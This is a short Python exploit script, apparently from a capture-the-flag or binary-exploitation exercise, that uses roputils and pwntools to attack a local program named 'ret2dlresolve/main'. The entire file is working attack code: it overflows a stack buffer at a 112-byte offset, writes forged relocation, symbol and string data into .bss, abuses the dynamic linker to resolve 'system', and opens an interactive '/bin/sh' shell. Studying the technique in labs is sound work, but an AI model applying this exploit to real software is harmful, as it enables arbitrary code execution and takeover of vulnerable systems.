from roputils import *
from pwn import process
from pwn import gdb
from pwn import context
r = process('ret2dlresolve/main')
context.log_level = 'debug'
r.recv()

rop = ROP('ret2dlresolve/main')
offset = 112
bss_base = rop.section('.bss') # no need to call method in the fake stack, so NO need to leave space for the fake stack
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
# used to call dl_Resolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
# used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()
